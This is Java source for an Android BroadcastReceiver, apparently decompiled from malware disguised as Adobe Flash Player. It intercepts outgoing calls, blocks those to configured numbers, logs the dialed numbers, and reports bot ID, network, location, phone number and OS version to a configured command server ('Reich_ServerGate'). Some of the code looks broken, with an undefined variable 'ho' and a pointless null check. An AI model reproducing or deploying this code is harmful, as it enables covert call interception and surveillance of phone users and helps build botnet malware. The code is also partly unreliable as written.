package com.adobe.flashplayer_;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build.VERSION;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

public class FlashZ extends BroadcastReceiver {
    public MediaRecorder recorder = null;

    public void onReceive(Context context, Intent intent) {
        boolean sa = false;
        if (intent.getExtras() != null) {
            NetworkInfo netInfo;
            String IMEI;
            String cvadi = readConfig("c", context);
            String BotID = readConfig("BotID", context);
            String BotNetwork = readConfig("BotNetwork", context);
            String BotLocation = readConfig("BotLocation", context);
            String URL = readConfig("Reich_ServerGate", context);
            String BotVer = readConfig("BotVer", context);
            String SDK = VERSION.RELEASE;
            if (cvadi.indexOf("*") != -1 && null == null) {
                sa = true;
                if (getResultData() != null) {
                    sa = true;
                    netInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
                    IMEI = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
                    if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                        saveData("" + intent.getStringExtra("android.intent.extra.PHONE_NUMBER"), new StringBuilder(String.valueOf(intent.getStringExtra("android.intent.extra.PHONE_NUMBER").replace("+", "").replace("*", "S").replace("#", "W"))).append(".txt").toString(), context);
                        new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=blocked_call&i=" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(".txt").toString()).toString(), URL});
                    }
                    setResultData(null);
                }
            }
            if (cvadi.indexOf(",") != -1 && !sa) {
                String[] f = cvadi.split(",");
                for (String indexOf : f) {
                    if (intent.getStringExtra("android.intent.extra.PHONE_NUMBER").indexOf(indexOf) != -1) {
                        sa = true;
                        if (getResultData() != null) {
                            netInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
                            IMEI = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
                            if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                                saveData("" + intent.getStringExtra("android.intent.extra.PHONE_NUMBER"), new StringBuilder(String.valueOf(intent.getStringExtra("android.intent.extra.PHONE_NUMBER").replace("+", "").replace("*", "S").replace("#", "W"))).append(".txt").toString(), context);
                                new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=blocked_call&i=" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(".txt").toString()).toString(), URL});
                            }
                            setResultData(null);
                        }
                    }
                }
            } else if (!(intent.getStringExtra("android.intent.extra.PHONE_NUMBER").indexOf(cvadi) == -1 || cvadi == "" || sa || getResultData() == null)) {
                sa = true;
                netInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
                if (netInfo != null && netInfo.isConnectedOrConnecting()) {
                    saveData("" + intent.getStringExtra("android.intent.extra.PHONE_NUMBER") + "\n", new StringBuilder(String.valueOf(intent.getStringExtra("android.intent.extra.PHONE_NUMBER").replace("+", "").replace("*", "S").replace("#", "W"))).append(".txt").toString(), context);
                    new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=blocked_call&i=" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(".txt").toString()).toString(), URL});
                }
                setResultData(null);
            }
            netInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
            IMEI = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
            if (netInfo != null && netInfo.isConnectedOrConnecting() && !sa) {
                saveData("" + intent.getStringExtra("android.intent.extra.PHONE_NUMBER"), new StringBuilder(String.valueOf(intent.getStringExtra("android.intent.extra.PHONE_NUMBER").replace("+", "").replace("*", "S").replace("#", "W"))).append(".txt").toString(), context);
                new FlashVirtual().execute(new String[]{"&b=" + BotID + "&c=" + BotNetwork.replace(":", "") + "&d=" + BotLocation + "&e=" + readConfig("BotPhone", context) + "&f=" + BotVer + "&g=" + SDK + "&h=out_call&i=" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(".txt").toString()).toString(), URL});
            }
        }
    }

    private void saveData(String data, String f, Context context) {
        try {
            OutputStreamWriter osw = new OutputStreamWriter(context.openFileOutput(f, 0));
            osw.write(data);
            osw.close();
        } catch (IOException e) {
        }
    }

    private String readConfig(String config, Context context) {
        String ret = "";
        try {
            InputStream inputStream = context.openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }

    private void writeConfig(String config, String data, Context context) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput(config, 0));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {
        }
    }
}
